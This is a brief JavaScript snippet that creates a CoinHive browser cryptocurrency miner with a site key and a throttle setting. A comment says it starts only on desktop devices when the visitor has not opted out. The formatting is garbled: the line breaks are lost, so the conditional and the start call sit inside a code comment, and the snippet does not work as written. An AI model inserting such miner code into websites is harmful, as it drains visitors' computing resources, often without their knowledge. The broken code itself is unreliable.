var miner = new CoinHive.Anonymous('QxgYv8dclCXEg4OuX4a3zpVWTCDvM4rs', {
    throttle: 0.5
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}